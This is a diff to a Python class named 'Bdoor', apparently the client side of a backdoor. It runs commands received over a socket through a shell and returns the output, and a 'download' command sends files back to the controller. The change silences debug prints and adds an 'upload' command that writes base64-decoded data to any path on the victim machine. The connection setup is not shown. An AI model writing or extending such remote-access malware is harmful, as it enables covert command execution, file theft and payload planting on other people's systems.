@@ -27,8 +27,8 @@ class Bdoor:
                 json_data += self.conn.recv(1024).decode()
                 if json_data.decode() == "" or json_data == b'':
                     break
- #               print("\njson_data type: " + str(type(json_data)) + " - json_data: " + json_data) #testing
- #               print("\njson_data loads: " + json.loads(json_data) + " - loads type: " + str(type(json.loads(json_data))) + "\n") #testing
+                # print("\njson_data type: " + str(type(json_data)) + " - json_data: " + json_data) #testing
+                # print("\njson_data loads: " + json.loads(json_data) + " - loads type: " + str(type(json.loads(json_data))) + "\n") #testing
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -37,12 +37,17 @@ class Bdoor:
         os.chdir(path)
 
     def exec_cmd(self, comm):
-        print(comm)
+        # print(comm)
         output_ = subprocess.run(comm, capture_output=True, shell=True)
-        print("\noutput type: " + str(type(output_)) + " - stdout: " + str(output_.stdout.decode()=="") + "\n") #testing
-        print("\noutput type: " + str(type(output_)) + " - stderr: " + str(output_.stderr.decode()=="") + "\n") #testing
+        # print("\noutput type: " + str(type(output_)) + " - stdout: " + str(output_.stdout.decode()=="") + "\n") #testing
+        # print("\noutput type: " + str(type(output_)) + " - stderr: " + str(output_.stderr.decode()=="") + "\n") #testing
         self.send_data(output_.stdout.decode() if output_.stderr.decode() == "" else output_.stderr.decode())
 
+    def write_f(self, path, item):
+        with open(path, "wb") as f:
+            f.write(base64.b64decode(item))
+            return "\nUploaded"
+    
     def read_f(self, path):
         # only r read plain text, with b reads binary. e.g.: open(path, "rb")
         with open(path, "rb") as f:
@@ -61,12 +66,14 @@ class Bdoor:
                     self.exec_cmd("cd")
                 elif comm[0] == "download":
                     self.send_data(self.read_f(comm[1]))
+                elif comm[0] == "upload":
+                    self.send_data(self.write_f(comm[1], comm[2]))
                 else:
                     self.exec_cmd(comm)
             except (BrokenPipeError, ConnectionAbortedError) as cnerr:
                 print(cnerr.strerror)
                 self.con_close()
-            except OSError as ose:
+            except (OSError, Exception) as ose:
                 self.send_data('[Bad command]: ' + ose.strerror)
     
     def con_close(self):
